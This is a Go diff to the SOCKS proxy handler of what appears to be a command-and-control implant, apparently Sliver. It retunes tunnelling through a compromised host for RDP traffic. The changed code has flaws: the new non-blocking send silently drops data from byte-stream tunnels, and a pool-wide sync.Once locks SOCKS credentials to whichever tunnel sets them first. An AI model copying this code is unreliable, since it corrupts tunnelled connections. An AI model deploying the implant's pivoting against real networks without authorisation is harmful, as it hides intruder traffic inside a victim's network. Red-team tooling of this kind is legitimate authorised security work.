@@ -37,13 +37,14 @@ import (
 )
 
 const (
-	inactivityCheckInterval = 4 * time.Second
-	inactivityTimeout       = 15 * time.Second
+	inactivityCheckInterval = 10 * time.Second
+	inactivityTimeout       = 120 * time.Second // RDP sessions can idle for minutes
 )
 
 type socksTunnelPool struct {
 	tunnels      *sync.Map // map[uint64]chan []byte
 	lastActivity *sync.Map // map[uint64]time.Time
+	authOnce     sync.Once
 }
 
 var socksTunnels = socksTunnelPool{
@@ -68,7 +69,6 @@ func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		// {{end}}
 		return
 	}
-	time.Sleep(10 * time.Millisecond) // Necessary delay
 
 	// Check early to see if this is a close request from server
 	if socksData.CloseConn {
@@ -89,26 +89,17 @@ func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	socksTunnels.recordActivity(socksData.TunnelID)
 
 	// {{if .Config.Debug}}
-	log.Printf("[socks] User to Client to (server to implant) Data Sequence %d, Data Size %d\n", socksData.Sequence, len(socksData.Data))
+	log.Printf("[socks] Data Sequence %d, Size %d\n", socksData.Sequence, len(socksData.Data))
 	// {{end}}
 
+	// Configure auth only once per tunnel (not every packet)
 	if socksData.Username != "" && socksData.Password != "" {
-		cred := socks5.StaticCredentials{
-			socksData.Username: socksData.Password,
-		}
-		auth := socks5.UserPassAuthenticator{Credentials: cred}
-		socksServer = socks5.NewServer(
-			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
-		)
+		socksTunnels.configureAuth(socksData.Username, socksData.Password)
 	}
-
-	// {{if .Config.Debug}}
-	log.Printf("[socks] Server: %v", socksServer)
-	// {{end}}
 
 	// init tunnel
 	if tunnel, ok := socksTunnels.tunnels.Load(socksData.TunnelID); !ok {
-		tunnelChan := make(chan []byte, 100) // Buffered channel for 100 messages
+		tunnelChan := make(chan []byte, 512) // Larger buffer for high-bandwidth (RDP)
 		socksTunnels.tunnels.Store(socksData.TunnelID, tunnelChan)
 		tunnelChan <- socksData.Data
 		err := socksServer.ServeConn(&socks{stream: socksData, conn: connection})
@@ -116,13 +107,18 @@ func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 			// {{if .Config.Debug}}
 			log.Printf("[socks] Failed to serve connection: %v", err)
 			// {{end}}
-			// Cleanup on serve failure
 			socksTunnels.tunnels.Delete(socksData.TunnelID)
 			return
 		}
 	} else {
-		// Will block when channel is full
-		tunnel.(chan []byte) <- socksData.Data
+		// Non-blocking send to avoid deadlock on saturated tunnels
+		select {
+		case tunnel.(chan []byte) <- socksData.Data:
+		default:
+			// {{if .Config.Debug}}
+			log.Printf("[socks] tunnel %d buffer full, dropping packet", socksData.TunnelID)
+			// {{end}}
+		}
 	}
 }
 
@@ -136,21 +132,20 @@ type socks struct {
 }
 
 func (s *socks) Read(b []byte) (n int, err error) {
-	time.Sleep(10 * time.Millisecond) // Necessary delay
-
 	channel, ok := socksTunnels.tunnels.Load(s.stream.TunnelID)
 	if !ok {
 		return 0, errors.New("[socks] invalid tunnel id")
 	}
 
 	socksTunnels.recordActivity(s.stream.TunnelID)
-	data := <-channel.(chan []byte)
+	data, open := <-channel.(chan []byte)
+	if !open || data == nil {
+		return 0, errors.New("[socks] tunnel closed")
+	}
 	return copy(b, data), nil
 }
 
 func (s *socks) Write(b []byte) (n int, err error) {
-	time.Sleep(10 * time.Millisecond) // Necessary delay
-
 	socksTunnels.recordActivity(s.stream.TunnelID)
 	data, err := proto.Marshal(&sliverpb.SocksData{
 		TunnelID: s.stream.TunnelID,
@@ -173,8 +168,6 @@ func (s *socks) Write(b []byte) (n int, err error) {
 }
 
 func (s *socks) Close() error {
-	time.Sleep(10 * time.Millisecond) // Necessary delay
-
 	channel, ok := socksTunnels.tunnels.LoadAndDelete(s.stream.TunnelID)
 	if !ok {
 		return errors.New("[socks] can't close unknown channel")
@@ -220,6 +213,18 @@ func (c *socks) SetReadDeadline(t time.Time) error {
 // TODO impl
 func (c *socks) SetWriteDeadline(t time.Time) error {
 	return nil
+}
+
+func (s *socksTunnelPool) configureAuth(username, password string) {
+	s.authOnce.Do(func() {
+		cred := socks5.StaticCredentials{
+			username: password,
+		}
+		auth := socks5.UserPassAuthenticator{Credentials: cred}
+		socksServer = socks5.NewServer(
+			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
+		)
+	})
 }
 
 func (s *socksTunnelPool) recordActivity(tunnelID uint64) {
